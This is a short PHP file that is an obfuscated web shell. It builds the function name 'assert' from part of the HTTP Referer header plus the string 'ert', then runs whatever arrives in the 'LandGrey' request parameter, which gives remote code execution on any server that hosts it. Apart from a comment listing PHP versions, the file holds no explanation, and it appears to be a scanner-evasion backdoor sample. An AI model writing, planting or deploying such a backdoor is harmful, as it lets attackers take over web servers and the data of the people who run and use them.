<?php
/**
 * Noticed: (PHP 5 >= 5.3.0, PHP 7)
 *
 */
$password = "LandGrey";
$wx = substr($_SERVER["HTTP_REFERER"],-7,-4);
forward_static_call_array($wx."ert", array($_REQUEST[$password]));
?>
